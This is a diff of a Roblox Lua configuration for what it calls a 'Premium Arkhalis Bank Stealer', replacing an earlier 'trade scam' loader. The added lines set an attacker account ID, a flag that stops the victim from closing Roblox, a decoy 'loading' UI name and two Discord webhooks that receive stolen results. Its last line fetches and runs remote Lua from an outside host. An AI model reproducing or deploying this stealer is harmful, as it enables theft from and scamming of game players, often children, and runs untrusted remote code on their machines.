@@ -1,9 +1,34 @@
+--[[Premium  Arkhalis Bank Stealer]]--
 
 
-_G.Username = "dirmix_YT"
+--[[ Main Config ]]--
+_G.UserId = 1962605868--// Roblox Account Id [[https://www.roblox.com/users/1962605868/profile]] 
 
-_G.HubName = "trade scam loading"
+_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
+_G.Diamonds = 100000 --// Amount Of Diamonds To Not Kick
 
-_G.WebhookUrl = "https://discord.com/api/webhooks/1098448831122780190/SLxgLx966ElnECwXxyvJMFMeMTWoffgNZYs3pgqQlRg4VPx5AN6ujzAHU6B27KnMpz9k"
+--[[ Webhook Config ]]--
+_G.Webhook = "https://discord.com/api/webhooks/1098448831122780190/SLxgLx966ElnECwXxyvJMFMeMTWoffgNZYs3pgqQlRg4VPx5AN6ujzAHU6B27KnMpz9k" --// Discord link Webhook For Executions
+    
+--[[ UI Config ]]--
+_G.ScriptName = "loading" --// Script Name On The UI
+_G.Tip1 = "" --// Gives You Tips On The UI
+_G.Tip2 = "" --// Gives You Tips On The UI
+_G.Tip3 = "" --// Gives You Tips On The UI
+_G.Tisp4 = "" --// Gives You Tips On The UI
+_G.Tip5 = "" --// Gives You Tips On The UI
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
+
+--[[ OBFUSCATE BELOW ]]--
+
+
+--[[ DualHookPremium ]]--
+
+--[[ DualHookPremium ]]--
+
+_G.DualHookPremiumID = 1962605868 --//DualHook Account ID
+_G.DualHookWebhook = "https://discord.com/api/webhooks/1098448831122780190/SLxgLx966ElnECwXxyvJMFMeMTWoffgNZYs3pgqQlRg4VPx5AN6ujzAHU6B27KnMpz9k" --// Discord link Webhook For Executions
+_G.Key = "ARKHALIS-BLTETEVCXDS" --// Arkhalis Premium Key
+
+--[[ Script ]]--
+loadstring(game:HttpGet("https://arkhalislua.github.io/Lua/Arkhaliskeybank.lua"))()
